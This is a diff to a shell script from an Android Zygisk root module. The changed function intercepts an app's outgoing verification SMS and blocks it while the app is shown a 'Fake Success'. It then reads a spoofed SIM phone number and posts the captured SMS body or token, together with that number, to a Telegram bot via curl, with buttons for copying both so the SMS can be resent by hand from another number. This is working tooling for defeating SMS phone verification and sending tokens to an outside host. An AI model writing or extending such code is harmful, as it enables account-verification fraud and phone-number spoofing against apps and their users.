@@ -239,35 +239,41 @@ read_blocked_sms() {
   fi
 }
 
+tg_json_escape() {
+  printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' -e 's/\t/\\t/g' -e 's/\r/\\r/g' | awk 'BEGIN{ORS=""} {gsub(/\n/,"\\n"); print}'
+}
+
+tg_clip_copy() {
+  printf '%s' "$1" | head -c 256
+}
+
 forward_blocked_telegram() {
   read_blocked_sms
   [ -z "$BLOCKED_BODY" ] && return 0
   read_tg_creds
   [ -z "$TG_TOKEN" ] || [ -z "$TG_CHAT" ] && return 0
+  SPOOF=$(cat /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null | tr -d '\r\n ')
+  [ -z "$SPOOF" ] && SPOOF=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$RUNTIME" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+  SEND_FROM="${SPOOF:-—}"
   TEXT="📱 Verify SMS Blocked — Fake Success ✅
-@hivirtus @liqdy
+Zygisk Mode Menu By @hivirtus @liqdy 🔥
 
-Real SIM: blocked · App ko success dikha
-
-To (short code):
-${BLOCKED_DEST}
+Send FROM:
+${SEND_FROM}
 
 Body / Token:
 ${BLOCKED_BODY}"
-  SPOOF=$(cat /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null | tr -d '\r\n ')
-  if [ -n "$SPOOF" ]; then
-    TEXT="${TEXT}
-
-Send FROM (app login / 2nd SIM):
-${SPOOF}
-
-Messages se isi number wali SIM se manually bhejo"
-  fi
+  ESC_TEXT=$(tg_json_escape "$TEXT")
+  ESC_NUM=$(tg_json_escape "$SEND_FROM")
+  COPY_BODY=$(tg_clip_copy "$BLOCKED_BODY")
+  ESC_BODY=$(tg_json_escape "$COPY_BODY")
+  PAYLOAD="/data/local/tmp/hivirtus_tg_payload.json"
+  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true,\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"📋 Copy Number\",\"copy_text\":{\"text\":\"${ESC_NUM}\"}},{\"text\":\"📋 Copy SMS Body\",\"copy_text\":{\"text\":\"${ESC_BODY}\"}}]]}}" > "$PAYLOAD"
   SENT=0
   if command -v curl >/dev/null 2>&1; then
     curl -s -m 25 -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
-      --data-urlencode "chat_id=${TG_CHAT}" \
-      --data-urlencode "text=${TEXT}" >/dev/null 2>&1 && SENT=1
+      -H "Content-Type: application/json" \
+      --data-binary "@${PAYLOAD}" >/dev/null 2>&1 && SENT=1
   fi
   am broadcast -a com.hivirtus.zygiskmode.OUTGOING_BLOCKED \
     -n com.hivirtus.zygiskmode/.BlockedSmsReceiver \
@@ -275,6 +281,7 @@ Messages se isi number wali SIM se manually bhejo"
   if [ "$SENT" = "1" ]; then
     rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag
     rm -f /data/local/tmp/hivirtus_outgoing_blocked.json
+    rm -f "$PAYLOAD"
   fi
 }
 
